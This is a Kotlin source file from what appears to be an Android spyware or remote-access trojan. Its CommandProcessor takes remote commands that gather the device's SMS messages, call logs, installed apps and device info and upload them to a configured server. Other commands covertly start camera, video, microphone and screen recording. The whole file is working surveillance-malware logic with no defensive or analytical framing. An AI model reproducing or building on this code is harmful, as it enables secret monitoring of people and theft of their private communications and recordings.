package com.kashem.shaikh

import android.content.Context
import android.util.Log

object CommandProcessor {

    fun processCommand(command: String, context: Context) {
        when {
            command.startsWith("device_info") -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) return
                val (host, _) = urls
                val file = DeviceInfo.collectInfo(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Device info uploaded")
                }
            }
            command == "apps" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = AppList.collectApps(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "App list uploaded")
                }
            }
            command == "messages" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = MessageCollector.collectMessages(context) ?: return
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Messages uploaded")
                }
            }
            command == "calls" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = CallLogCollector.collectCallLogs(context) ?: return
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Call logs uploaded")
                }
            }
            command == "camera_selfie" -> ForegroundService.startFrontCamera(context)
            command == "camera_main" -> ForegroundService.startBackCamera(context)
            command == "stop_camera" -> ForegroundService.stopCamera(context)
            command == "video_camera_main" -> ForegroundService.startVideoMain(context)
            command == "video_camera_selfie" -> ForegroundService.startVideoSelfie(context)
            command == "stop_video" -> ForegroundService.stopVideo(context)
            command.startsWith("audio_record") -> {
                val duration = command.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration)
            }
            command.startsWith("audio_external") -> {
                val duration = command.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration)
            }
            command == "stop_audio" -> ForegroundService.stopAudio(context)

            // ==================== স্ক্রিন রেকর্ড কমান্ড ====================
            command == "screen_record_start" -> {
                ForegroundService.startScreenRecord(context)
            }
            command == "screen_record_stop" -> {
                ForegroundService.stopScreenRecord(context)
            }
            // =============================================================

            else -> Log.d("CommandProcessor", "Unknown command: $command")
        }
    }
}